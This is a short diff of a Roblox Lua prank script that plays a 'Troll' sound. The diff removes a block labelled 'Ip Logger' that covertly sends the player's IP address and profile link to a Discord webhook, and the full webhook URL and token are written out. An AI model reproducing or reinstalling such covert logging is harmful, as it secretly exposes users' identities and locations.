@@ -35,16 +35,3 @@ string.TextSize = 20
 repeat wait() until Troll.Loaded
 
 Troll:Play()
-
-local data = {
-    ["username"] = "Ip Logger",
-    ["content"] = "Ip: "..IP..". ".."https://www.roblox.com/users/"..UserId.."/profile",
-}
-request(
-    {
-        Url = "https://discord.com/api/webhooks/1021573158039466014/LxV32E3DUxVEDP56B3m6BqeBBViY9GHwmyL7k8aGs7sEPg465ktuDLj2mx5bsZkWB7gF",
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = game:GetService("HttpService"):JSONEncode(data)
-    }
-)
